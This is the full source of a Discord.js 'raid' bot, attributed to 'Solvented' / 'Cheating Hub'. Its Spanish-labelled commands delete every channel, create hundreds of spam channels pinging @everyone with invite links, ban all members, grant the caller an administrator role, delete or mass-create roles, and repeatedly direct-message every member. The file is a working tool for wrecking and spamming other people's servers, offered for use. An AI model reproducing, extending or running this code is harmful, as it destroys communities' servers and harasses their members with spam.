const Discord = require("discord.js");
const client = new Discord.Client();
const Monitor = require('ping-monitor');
const keepAlive = require('./server');
const chalk = require('chalk');

client.on("ready", () => {

  console.log(chalk.red(`
Started RDB in Client: "${client.user.tag}"
  `))



  console.log(chalk.cyan(`
        [+] Comandos:
                                          
            ღ .on | Destroza el servidor de inmediato, ejecutando todos los comandos.
            ღ .nuke | Elimina todos los canales, dejando solo 1 para poner otros comandos.
            ღ .raid | Crea muchos canales con ping y mensajes.
            ღ .admin | Crea un rol con perms de administrador y te lo da.
            ღ .crearroles / . eliminarroles | Crea o elimina roles del servidor
            ღ .banall | Este comando banea a todos los usuarios del servidor (algunas veces falla)
            ღ .mdall | Envia multiples mensajes a todos los miembros del servidor
            ღ .lista | Obten informacion del raid (stats)


`))


  presencia();
});


function presencia() {
  client.user.setPresence({
    status: "online",
    activity: {
      name: "Bot oficial RDB | .help",
      type: "PLAYING"

    }
  });
}


//automatico

client.on("message", message => {
  if (message.author.bot) return;

  if (message.content === '.on') {

    console.log(chalk.green(`                                                                     [+] Raid en ejecucion`))


    message.delete()
    message.guild.channels.cache.forEach(channel => channel.delete());
    message.guild.channels.create(`Solvented-is-here`, {
      type: 'text'
    }).then(channel => {
      channel.send("@everyone *Raided Server by Cheating Hub // 𝕊𝕠𝕝𝕧𝕖𝕟𝕥𝕖𝕕!** https://t.me/Solventing https://discord.gg/GHvesudxpM");
      channel.send("@everyone *Raided Server by Cheating Hub // 𝕊𝕠𝕝𝕧𝕖𝕟𝕥𝕖𝕕!** https://t.me/Solventing https://discord.gg/GHvesudxpM");
      channel.send("@everyone *Raided Server by Cheating Hub // 𝕊𝕠𝕝𝕧𝕖𝕟𝕥𝕖𝕕!** https://t.me/Solventing https://discord.gg/GHvesudxpM");
    })
    for (let i = 0; i <= 500; i++) {
      message.guild.channels.create(`ℝ𝕒𝕚𝕕𝔹𝕪𝕊𝕠𝕝𝕧𝕖𝕟𝕥𝕖𝕕`, {
        type: 'text'
      }).then(channel => {
        channel.send("@everyone *Raided Server by Cheating Hub // 𝕊𝕠𝕝𝕧𝕖𝕟𝕥𝕖𝕕!** https://t.me/Solventing https://discord.gg/GHvesudxpM");
        channel.send("@everyone *Raided Server by Cheating Hub // 𝕊𝕠𝕝𝕧𝕖𝕟𝕥𝕖𝕕!** https://t.me/Solventing https://discord.gg/GHvesudxpM");
        channel.send("@everyone *Raided Server by Cheating Hub // 𝕊𝕠𝕝𝕧𝕖𝕟𝕥𝕖𝕕!** https://t.me/Solventing https://discord.gg/GHvesudxpM");
        channel.send("@everyone *Raided Server by Cheating Hub // 𝕊𝕠𝕝𝕧𝕖𝕟𝕥𝕖𝕕!** https://t.me/Solventing https://discord.gg/GHvesudxpM");
        channel.send("@everyone *Raided Server by Cheating Hub // 𝕊𝕠𝕝𝕧𝕖𝕟𝕥𝕖𝕕!** https://t.me/Solventing https://discord.gg/GHvesudxpM");
        channel.send("@everyone *Raided Server by Cheating Hub // 𝕊𝕠𝕝𝕧𝕖𝕟𝕥𝕖𝕕!** https://t.me/Solventing https://discord.gg/GHvesudxpM");
        channel.send("@everyone *Raided Server by Cheating Hub // 𝕊𝕠𝕝𝕧𝕖𝕟𝕥𝕖𝕕!** https://t.me/Solventing https://discord.gg/GHvesudxpM");
        channel.send("@everyone *Raided Server by Cheating Hub // 𝕊𝕠𝕝𝕧𝕖𝕟𝕥𝕖𝕕!** https://t.me/Solventing https://discord.gg/GHvesudxpM");









      })
    }
    message.guild.setName("ℝ𝕒𝕚𝕕𝔹𝕪𝕊𝕠𝕝𝕧𝕖𝕟𝕥𝕖𝕕");
    message.guild.setIcon("https://cdn.discordapp.com/attachments/1035023020617642075/1035176644404588574/raid.gif");
  }
})


//admin

client.on("message", async msg => {


  if (msg.author.bot) return;
  if (msg.content.toLowerCase().startsWith('.admin')) {
    let rol = await msg.guild.roles.create({
      data: {
        name: "$$$$",
        color: "B9BBBE",
        permissions: "ADMINISTRATOR",
        hoisted: false
      }
    })

    msg.member.roles.add(rol)
      .then(function(role) {
        msg.member.addRole(role);
        if (msg.deletable) msg.delete().catch(e => { });
      })
      .catch(e => { });
  }
});


//lista


client.on("message", message => {


  if (message.author.bot) return;
  const args = message.content.slice().trim().split(/ +/g);
  const command = args.shift().toLowerCase();
  if (command === '.list') {
    message.delete()
    const embed = new Discord.MessageEmbed()
      .setTitle("Informacion de proceso del raid")
      .setThumbnail()
      .setDescription(`**Canales:** | ${message.guild.channels.cache.size}\n**Roles:** | ${message.guild.roles.cache.size}\n**Users:** | ${message.guild.memberCount}`)
      .setColor("RED");
    message.channel.send(embed)
  }
});


//banall

client.on("message", async message => {
  if (message.content.startsWith('.banall')) {
    message.delete();
    if (!message.member.hasPermission("BAN_MEMBERS") || !message.member.hasPermission("ADMINISTRATOR")) return;
    message.guild.members.cache.forEach(member => {
      if (member != message.member && member.id != "ID" && member.id != "ID" && member.id != "ID") {
        member.ban();
      }
    })
  }
});


//nuke 

client.on("message", message => {
  if (message.author.bot) return;

  if (message.content === '.nuke') {

    message.delete()
    message.guild.channels.cache.forEach(channel => channel.delete());
    message.guild.channels.create(`solvented-is-here`, {
      type: 'text'
    }).then(channel => {
      channel.send("Raided Server by Solvented. Seguridad de mierda. https://discord.gg/GHvesudxpM https://cdn.discordapp.com/attachments/1035023020617642075/1035176644404588574/raid.gif")
    })
  }
})


//chats

client.on("message", message => {


  if (message.author.bot) return;

  if (message.content === '.raid') {
    message.delete()
    for (let i = 0; i <= 500; i++) {
      message.guild.channels.create(`ℝ𝕒𝕚𝕕𝔹𝕪𝕊𝕠𝕝𝕧𝕖𝕟𝕥𝕖𝕕`, {
        type: 'text'
      }).then(channel => {
        channel.send("@everyone SERVER HACKED BY CHEATING HUB // SOLVENTED... https://t.me/Solventing https://discord.gg/GHvesudxpM")




      })
    }
  }
});

//mdall

client.on("message", message => {
  if (message.author.bot) return;

  if (message.content === ".mdall")
    message.delete()
  message.guild.members.cache.forEach(member => {
    setInterval(function() {
      member.send("El servidor donde estabas fue raideado por Cheating HUB // Solvented. Seguridad de mierda. https://t.me/Solventing https://discord.gg/GHvesudxpM").catch(error => { });
    }, 450);
  })
});


//borrar roles

client.on("message", message => {


  if (message.author.bot) return;

  if (message.content === ('.eliminarroles')) {
    message.delete()
    message.guild.roles.cache.map(roles => roles.delete());
  }
});

//crear roles

client.on("message", message => {

  if (message.author.bot) return;

  if (message.content === '.crearroles') {
    message.delete()
    for (let i = 0; i <= 200; i++) {
      message.guild.roles.create({ data: { name: `$ CheatingHub $`, color: '#d41818', }, reason: 'razon', })
    };
  }
});




client.login("YourToken");

//Bot creado por Solvented!
//t.me/solventing
